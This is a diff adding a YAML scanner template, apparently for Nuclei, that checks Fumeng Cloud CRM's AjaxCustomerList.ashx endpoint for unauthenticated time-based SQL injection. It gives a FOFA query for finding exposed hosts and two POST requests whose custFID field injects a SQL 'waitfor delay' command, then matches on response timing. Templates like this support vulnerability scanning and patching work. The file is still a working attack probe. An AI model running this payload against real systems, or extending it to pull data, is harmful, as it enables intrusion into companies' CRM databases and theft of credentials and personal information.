@@ -1,0 +1,29 @@
+id: fumeng-cloud-crm-ajaxcustomerlist-sqli
+info:
+  name: 孚盟云CRM AjaxCustomerList.ashx接口SQL注入漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: title="孚盟云" || body="/PageStructure/Mail/default.aspx"
+    上海孚盟软件有限公司是一家专注于外贸SaaS服务及行业解决方案的技术企业。其孚盟云CRM系统中的AjaxCustomerList.ashx接口存在SQL注入漏洞。攻击者无需身份验证即可通过构造恶意SQL查询，泄露数据库敏感信息（如管理员后台凭证、用户个人信息）。在特定权限条件下，攻击者可进一步利用该漏洞在服务器上部署恶意程序，从而实现对服务器的完全控制。
+  tags: 孚盟云CRM
+http:
+- raw:
+  - |
+    POST /m/Dingding/Ajax/AjaxCustomerList.ashx HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/x-www-form-urlencoded
+
+    method=GetCustomerInfoByFid&custFID=123';waitfor+delay+'0:0:5'--+
+  - |
+    POST /m/Dingding/Ajax/AjaxCustomerList.ashx HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/x-www-form-urlencoded
+
+    method=GetCustomerInfoByFid&custFID=123';waitfor+delay+'0:0:8'--+
+  matchers:
+  - type: dsl
+    dsl:
+    - duration_1>=5 && duration_1<=6
+    - duration_2>=8 && duration_2<=9
+    condition: and
